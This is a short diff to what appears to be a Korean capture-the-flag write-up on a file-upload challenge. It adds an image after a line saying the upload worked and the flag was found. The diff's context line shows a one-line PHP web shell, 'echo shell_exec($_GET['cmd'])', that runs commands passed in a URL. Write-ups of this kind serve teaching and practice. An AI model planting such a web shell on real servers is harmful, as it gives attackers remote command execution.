@@ -12,4 +12,5 @@ echo shell_exec($_GET['cmd']);
 
 ![image1](1.PNG)   
 
-성공적으로 업로드가 되어서 쉽게 flag를 확인할 수 있었다.
+성공적으로 업로드가 되어서 쉽게 flag를 확인할 수 있었다.    
+![image2](2.PNG)
